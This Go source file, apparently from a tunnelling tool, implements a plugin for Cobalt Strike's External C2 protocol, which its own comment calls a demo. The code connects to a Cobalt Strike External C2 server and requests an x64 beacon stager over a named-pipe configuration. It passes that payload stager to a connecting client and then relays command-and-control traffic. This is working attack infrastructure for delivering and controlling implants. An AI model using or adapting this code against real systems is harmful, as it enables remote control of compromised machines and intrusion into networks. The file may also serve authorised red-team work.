package externalc2

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"

	"github.com/chainreactors/rem/protocol/core"
	"github.com/chainreactors/rem/x/utils"
)

// Warnning! this is demo for CobaltStrike external C2 impl
func init() {
	core.OutboundRegister(core.CobaltStrikeServe, NewExternalC2Outbound)
	core.InboundRegister(core.CobaltStrikeServe, NewExternalC2Inbound)
}

type ExternalC2Plugin struct {
	*core.PluginOption
	dial core.ContextDialer
	Dest string
}

// Frame 表示ExternalC2的帧格式
type Frame struct {
	Length uint32
	Data   []byte
}

// ReadFrame 从io.Reader读取一个帧
func ReadFrame(r io.Reader) (*Frame, error) {
	var length uint32
	if err := binary.Read(r, binary.LittleEndian, &length); err != nil {
		return nil, err
	}

	data := make([]byte, length)
	if _, err := io.ReadFull(r, data); err != nil {
		return nil, err
	}

	return &Frame{Length: length, Data: data}, nil
}

// WriteFrame 将帧写入io.Writer
func WriteFrame(w io.Writer, data []byte) error {
	length := uint32(len(data))
	if err := binary.Write(w, binary.LittleEndian, length); err != nil {
		return err
	}
	_, err := w.Write(data)
	return err
}

type Config struct {
	Arch     string
	Pipename string
	Block    string
}

func (c *Config) GetStager(w io.ReadWriter) ([]byte, error) {
	err := WriteFrame(w, []byte("arch="+c.Arch))
	if err != nil {
		return nil, err
	}
	err = WriteFrame(w, []byte("pipename="+c.Pipename))
	if err != nil {
		return nil, err
	}
	err = WriteFrame(w, []byte("block="+c.Block))
	if err != nil {
		return nil, err
	}
	err = WriteFrame(w, []byte("go"))
	if err != nil {
		return nil, err
	}
	stager, err := ReadFrame(w)
	if err != nil {
		return nil, err
	}
	return stager.Data, nil
}

func (ep *ExternalC2Plugin) Handle(conn io.ReadWriteCloser, realConn net.Conn) (net.Conn, error) {
	// 连接到Cobalt Strike的External C2服务器
	remote, err := ep.dial.Dial("tcp", ep.Dest)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to External C2 server: %v", err)
	}

	// 读取配置选项
	config := &Config{
		Arch:     "x64",
		Pipename: "foobar",
		Block:    "500",
	}
	stager, err := config.GetStager(remote)
	if err != nil {
		remote.Close()
		return nil, err
	}

	if err := WriteFrame(conn, stager); err != nil {
		remote.Close()
		return nil, fmt.Errorf("failed to write payload stage: %v", err)
	}

	return remote, nil
}

func (ep *ExternalC2Plugin) Relay(conn net.Conn, bridge io.ReadWriteCloser) (net.Conn, error) {
	return conn, nil
}

func NewExternalC2Inbound(params map[string]string) (core.Inbound, error) {
	dest, ok := params["dest"]
	if !ok {
		return nil, fmt.Errorf("dest not found")
	}

	base := core.NewPluginOption(params, core.InboundPlugin, core.CobaltStrikeServe)
	utils.Log.Importantf("[agent.inbound] ExternalC2 serving: %s -> %s", params["src"], dest)
	return &ExternalC2Plugin{
		PluginOption: base,
		Dest:         dest,
	}, nil
}

func NewExternalC2Outbound(params map[string]string, dial core.ContextDialer) (core.Outbound, error) {
	dest, ok := params["dest"]
	if !ok {
		return nil, fmt.Errorf("dest not found")
	}

	base := core.NewPluginOption(params, core.OutboundPlugin, core.CobaltStrikeServe)
	utils.Log.Importantf("[agent.outbound] ExternalC2 serving: %s -> %s", dest, params["src"])
	return &ExternalC2Plugin{
		PluginOption: base,
		dial:         dial,
		Dest:         dest,
	}, nil
}

func (ep *ExternalC2Plugin) Name() string {
	return core.CobaltStrikeServe
}
